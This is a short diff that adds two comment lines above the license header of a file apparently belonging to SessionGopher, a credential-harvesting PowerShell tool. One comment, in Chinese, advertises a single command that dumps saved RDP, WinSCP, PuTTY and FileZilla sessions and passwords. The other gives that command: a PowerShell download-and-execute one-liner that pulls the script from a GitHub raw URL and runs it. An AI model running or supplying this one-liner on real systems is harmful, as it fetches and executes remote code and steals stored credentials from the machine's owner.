@@ -1,3 +1,6 @@
+//powershell一条命令导出rdp/winscp/putty/FileZilla会话与密码
+//powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fireeye/SessionGopher/master/SessionGopher.ps1');Invoke-SessionGopher -Thorough
+
 Copyright 2017 FireEye, created by Brandon Arvanaghi ([@arvanaghi](https://twitter.com/arvanaghi))
 
 Licensed under the Apache License, Version 2.0 (the "License");
